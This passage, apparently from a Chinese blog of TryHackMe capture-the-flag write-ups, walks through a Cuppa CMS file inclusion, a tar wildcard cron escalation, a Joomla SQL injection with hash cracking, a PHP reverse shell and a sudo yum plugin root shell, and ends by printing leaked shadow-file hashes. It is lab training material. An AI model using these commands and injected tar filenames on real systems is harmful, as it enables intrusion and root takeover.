<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839710.png" alt="image-20240412181625356"></p>
<p>可以找到该账户notes备忘录中的信息，发现这里添加了个CMS，我们访问看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839711.png" alt="image-20240412182141384"></p>
<p>尝试在二级目录下继续扫描敏感目录</p>
<pre><code class="hljs scss">dirsearch -u "http://<span class="hljs-number">10.10</span>.<span class="hljs-number">187.5</span>/<span class="hljs-number">45</span>kra24zxs28v3yd/<span class="hljs-string">"</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839712.png" alt="image-20240412182213649"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839713.png" alt="image-20240412182118384"></p>
<p>访问得到Cuppa CMS</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839714.png" alt="image-20240412185733142"></p>
<p>漏洞库找到CMS漏洞， 发现存在远程文件包含，那直接包含我们构造的恶意shell文件（在我们的恶意服务器上）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839715.png" alt="image-20240412185840653"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839716.png" alt="image-20240412185814689"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839717.png" alt="image-20240412183013045"></p>
<p>如上图，成功拿到shell，这以后得提权就不是常规思路了，我想到了suid，但是没办法利用，结果wp先是搞了一个稳定shell，看的计划任务，但就算我看到计划任务，也不知道如何利用（虽然想到修改，但是在那个shell下无法正常使用vim）</p>
<h2 id="tar通配符漏洞提权">Tar通配符漏洞提权</h2>
<pre><code class="hljs scss">which python #验证目标机有无Python环境
python -c "import pty ; pty<span class="hljs-selector-class">.spawn</span>('/bin/bash')" #利用Python环境将当前shell切换为一个更稳定的shell</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839718.png" alt="image-20240412183812906"></p>
<p>这里看到backup.sh存在计划任务，我们看其中写的什么</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839719.png" alt="image-20240412184025658"></p>
<pre><code class="hljs scss">-rwxr-xr-x <span class="hljs-number">1</span> root root      <span class="hljs-number">74</span> Sep <span class="hljs-number">17</span>  <span class="hljs-number">2019</span> backup<span class="hljs-selector-class">.sh</span></code></pre>
<blockquote>
<p>由上图可知以下信息：</p>
<p>backups目录下有一个backup.sh文件，其内容和作用是–切换目录至/var/www/html 并将该目录下的所有内容归档为backup.tgz压缩文件，该tgz文件保存在backups目录下；</p>
<p>通过查看/etc/crontab即定时任务可知–刚才描述的backups目录下的backup.sh文件是一个定时任务，该.sh脚本每分钟都会以root身份执行。</p>
</blockquote>
<p>在查询 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a> 网站后，我们发现通过<code>tar</code>命令可以利用一个名为<code>–checkpoint</code>的参数，该参数允许在每次归档 X 个文件时（X的默认值为10）显示“进度”消息， <code>–checkpoint</code>还可以与 <code>–checkpoint-action</code> 标志串联使用，<code>–checkpoint-action</code>标志允许在到达检查点（checkpoint）时以二进制或脚本的形式执行某些操作。</p>
<p>结合前述已知信息：由于backups目录下的backup.sh脚本中使用的通配符<code>* </code>将对 /var/www/html 目录中的所有文件和文件夹执行归档命令，因此我们可以通过在/var/www/html下添加 <code>–checkpoint=1</code> 文件（启用检查点功能）和 <code>–checkpoint-action=exec=xxx</code> 文件（指定要执行的操作，检查点值为1，每归档一个文件都执行指定操作），那么当 <code>tar</code> 处理到以上文件时，相关的文件名将会被有效地视为<code>tar</code>命令的参数–从而执行某些操作。</p>
<p>在/var/www/html目录下创建一个BASH脚本，该脚本的执行结果将创建一个实质为bash副本的 SUID 二进制文件，<a target="_blank" rel="noopener" href="http://xn--newroot-e73ku5cfzzg9amz7ct4r4kq3x5gcdrb.sh">我们将该脚本命名为newroot.sh</a>：</p>
<pre><code class="hljs scss">echo "cp /bin/bash /tmp/nroot &amp;&amp; chmod +s /tmp/nroot" &gt; newroot<span class="hljs-selector-class">.sh</span></code></pre>
<p>继续在/var/www/html目录下执行命令创建以下两个文件，这两个文件的实际作用是以文件名作为 tar 命令行中的参数:</p>
<pre><code class="hljs scss">touch "/<span class="hljs-selector-tag">var</span>/www/<span class="hljs-selector-tag">html</span>/<span class="hljs-attr">--checkpoint</span>=<span class="hljs-number">1</span>"
touch "/<span class="hljs-selector-tag">var</span>/www/<span class="hljs-selector-tag">html</span>/<span class="hljs-attr">--checkpoint-action</span>=exec=sh newroot<span class="hljs-selector-class">.sh</span>"</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839720.png" alt="image-20240412184558948"></p>
<p>大约一分钟后，cron 计划作业（即backups目录下的backup.sh脚本）将会以root权限自动运行，从而能够成功创建一个SUID文件（/tmp/nroot），我们可以使用 <code>-p</code> 标志执行该SUID文件，这将允许以该文件的所有者身份（root）执行此二进制文件，进而可以根据此二进制文件的内容切换到root shell。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839721.png" alt="image-20240412185217531"></p>
<p>最后得到root flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839722.png" alt="image-20240412185303621"></p>
<h2 id="总结">总结</h2>
<p>依旧常规nmap扫描，发现110的pop3邮件服务协议以及SMB的139和445端口的开放，于是尝试枚举SMB服务，发现存在匿名用户和mile用户两个共享文件夹，先访问匿名的看是否存在敏感信息结果发现了一些密码列表，由于路子断了，可以想到看看web站点是否有漏洞，扫目录发现存在邮件系统登录页面，于是借用上述密码列表，成功爆破出强口令。</p>
<p>登录进去之后就是找信息或者漏洞点了，结果发现SMB服务重置之后的密码，于是可以成功登录SMB服务了，登录mile用户之后又发现一些信息泄露，发现存在一个CMS站点，继续扫二级目录找到后台登录地址，接着发现存在Cuppa CMS远程文件包含漏洞，于是包含shell文件，反弹得到shell，接着用自带的Python建立一个稳定shell，接着尝试提权，发现常规思路无果，看到计划任务可疑，发现存在tar通配符漏洞提权，凭借参数 配合使用最终拿到root priv</p>
<h1 id="0x09-daily-bugle">0x09 Daily Bugle</h1>
<p>通过 SQLi 入侵 Joomla CMS 帐户，练习破解哈希值并利用 yum 提升您的权限。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839723.png" alt="image-20240426082505136"></p>
<h2 id="初始访问">初始访问</h2>
<p>常规nmap扫描</p>
<pre><code class="hljs scss">nmap -T4 -sC -sV -<span class="hljs-selector-tag">p</span>- <span class="hljs-number">10.10</span><span class="hljs-selector-class">.35</span><span class="hljs-selector-class">.116</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839724.png" alt="image-20240426082924306"></p>
<p>上图可以看到http-generator（这个可以说是识别当前web服务器指纹信息）写着joomla，那我们尝试搜一下相关利用</p>
<pre><code class="hljs scss">search joomla
use scanner/http/joomla_version
run</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839725.png" alt="image-20240426083249790"></p>
<p>可以看到得到版本等详细信息，这里没想到去网络漫游，搜寻相关漏洞，根据提示去搜索的</p>
<p>一个是在exploit漏洞库可以看到利用方法：这个用的是sqlmap，且需要设置很多参数。</p>
<p>但如果继续搜索就会发现如下项目，其中包含众多CMS的利用脚本，我们直接采用这个</p>
<p><a target="_blank" rel="noopener" href="https://github.com/XiphosResearch/exploits">https://github.com/XiphosResearch/exploits</a></p>
<h2 id="sql注入">SQL注入</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839726.png" alt="image-20240426085219701"></p>
<p>如上图，这里是脚本用法，可以看到它需要你写出目标IP，并且会为你dump出用户和session表</p>
<pre><code class="hljs scss">python2 joomblah<span class="hljs-selector-class">.py</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">35.116</span>/</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839727.png" alt="image-20240426085515253"></p>
<p>可以看到这里得到的表明，其中找到了一些用户名，这里我对于这个爆出来的数据理解错了，我以为user这里代表全都是用户名之类的，但当我看到wp的sqlmap结果，我悟了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839728.png" alt="image-20240426085833598"></p>
<p>这完全就是一个表结构而已，因此我们需要爆破后面的hash密码为明文即可（根据提示，使用john）</p>
<h2 id="john暴力破解">john暴力破解</h2>
<pre><code class="hljs scss">$<span class="hljs-number">2</span>y$<span class="hljs-number">10</span>$<span class="hljs-number">0</span>veO/JSFh4389Lluc4Xya<span class="hljs-selector-class">.dfy2MF</span><span class="hljs-selector-class">.bZhz0jVMw</span><span class="hljs-selector-class">.V</span><span class="hljs-selector-class">.d3p12kBtZutm</span><span class="hljs-comment">//写到文件中即可</span>
john <span class="hljs-attr">--wordlist</span>=/usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span> hash<span class="hljs-selector-class">.txt</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839729.png" alt="image-20240426090951162"></p>
<p>成功得到密码</p>
<p>继续网络漫游，搜寻获取后台之后如何getshell的思路，成功找到</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839730.png" alt="image-20240426092745193"></p>
<p>上图位置，可以照着箭头找到，接着利用msf生成php shell，替换上述文件内容</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839731.png" alt="image-20240426093132372"></p>
<h2 id="msf获得shell">msf获得shell</h2>
<p>之后访问文件所在路径即可，同时msf开启监听（记得设置的payload类型一致）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839732.png" alt="image-20240426093538101"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839733.png" alt="image-20240426101003694"></p>
<p>拿到之后发现当前用户是apache，root和home的用户都无权访问，提权也找不到（这里我也是误区，以为提权必须找一些配置的错误，但wp告诉我，可以找相关配置文件，可能会泄露用户密码）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839734.png" alt="image-20240426101109516"></p>
<h2 id="切换用户提权">切换用户提权</h2>
<p>如上图，这里的php文件，名字可疑，访问发现有数据库配置文件信息，其中包含密码，所以尝试该密码区切换用户之类的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839735.png" alt="image-20240426101214339"></p>
<pre><code class="hljs scss">su jjameson<span class="hljs-comment">//输入密码即可</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839736.png" alt="image-20240426100927146"></p>
<p>最后拿到flag，接下来看root</p>
<h2 id="sudo-提权">sudo 提权</h2>
<pre><code class="hljs scss">TF=$(mktemp -d)
cat &gt;<span class="hljs-variable">$TF</span>/x&lt;&lt;EOF
<span class="hljs-selector-attr">[main]</span>
plugins=<span class="hljs-number">1</span>
pluginpath=<span class="hljs-variable">$TF</span>
pluginconfpath=<span class="hljs-variable">$TF</span>
EOF

cat &gt;<span class="hljs-variable">$TF</span>/y<span class="hljs-selector-class">.conf</span>&lt;&lt;EOF
<span class="hljs-selector-attr">[main]</span>
enabled=<span class="hljs-number">1</span>
EOF

cat &gt;<span class="hljs-variable">$TF</span>/y<span class="hljs-selector-class">.py</span>&lt;&lt;EOF
import os
import yum
from yum<span class="hljs-selector-class">.plugins</span> import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='<span class="hljs-number">2.1</span>'
def <span class="hljs-built_in">init_hook</span>(conduit):
  os.<span class="hljs-built_in">execl</span>(<span class="hljs-string">'/bin/sh'</span>,<span class="hljs-string">'/bin/sh'</span>)
EOF

sudo yum -c <span class="hljs-variable">$TF</span>/x --enableplugin=y</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839737.png" alt="image-20240426102302904"></p>
<p>可以看到成功提权</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839738.png" alt="image-20240426102509406"></p>
<h2 id="总结">总结</h2>
<p>这道题就是靠web站点层层深入，先是nmap扫描的时候，扫出了web站点相关指纹信息：joomla，直接网上找相关exploit</p>
<p>发现存在sql注入，利用相关脚本得到后台账户密码，登录进去，就是找相关功能RCE，幸运的是在设置模版文件的地方发现能自定义PHP文件内容，直接注入msf生成的php反向shell，访问运行，得到shell。之后就是提权，这里是sudo提权，但在使用这个前提是，在web相关配置文件找到了用户的密码信息，得以su 切换用户（因为在此之前是apache身份）之后sudo -l发现yum，找到yum的sudo提权方式，拿到root身份</p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://github.com/n00bm45t3r/DailyBugle-tryhackme/blob/master/DailyBugle-tryahackme.md">Daily Bugle --tryhackme.com</a></p>
<p><a target="_blank" rel="noopener" href="https://mrjsec.co.uk/blog/daily-bugle/">Daily Bugle </a></p>
<p><a target="_blank" rel="noopener" href="https://sumb0dyblog.wordpress.com/2020/02/06/daily-bugle-tryhackme-hard-write-up/">DAILY BUGLE – TRYHACKME WRITE-UP</a></p>
<h1 id="0x10-overpass-2-hacked">0x10 Overpass 2 - Hacked</h1>
<p>立交桥被黑了！你能分析攻击者的行为并入侵吗？</p>
<h2 id="取证-分析-pcap">取证-分析 PCAP</h2>
<p>立交桥被黑了！SOC 团队（Paradox，恭喜晋升）在深夜值班时注意到可疑活动，同时查看 shibes，并设法在攻击发生时捕获数据包。你能弄清楚攻击者是如何进入的，并入侵Overpass的生产服务器吗？</p>
<p>注意：虽然这个房间是一个演练，但它需要熟悉工具和 Linux。我建议至少学习基本的 Wireshark 并完成 Linux 基础知识。</p>
<p>PCAP 文件的 md5sum：11c3b2e9221865580295bc662c35c6dc</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839739.png" alt="image-20240426104436133"></p>
<p>上图可以看到，上传文件的url为/development/，同时可以看到攻击者使用的payload</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839740.png" alt="image-20240426105014083"></p>
<p>上图可以看到攻击者获取到了密码，下图可以看到攻击者建立持久性的方法</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839741.png" alt="image-20240426105206257"></p>
<pre><code class="hljs scss">james:$<span class="hljs-number">6</span>$<span class="hljs-number">7</span>GS5e.yv<span class="hljs-variable">$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu</span>/VuRskugt1Ckul/SKGX.<span class="hljs-number">5</span>PyMpzAYo3Cg/:<span class="hljs-number">18464</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::
paradox:$<span class="hljs-number">6</span><span class="hljs-variable">$oRXQu43X</span><span class="hljs-variable">$WaAj3Z</span>/<span class="hljs-number">4s</span>EPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:<span class="hljs-number">18464</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::
szymex:$<span class="hljs-number">6</span><span class="hljs-variable">$B</span>.EnuXiO<span class="hljs-variable">$f</span>/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:<span class="hljs-number">18464</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::
bee:$<span class="hljs-number">6</span>$.SqHrp6z<span class="hljs-variable">$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0</span>:<span class="hljs-number">18464</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::
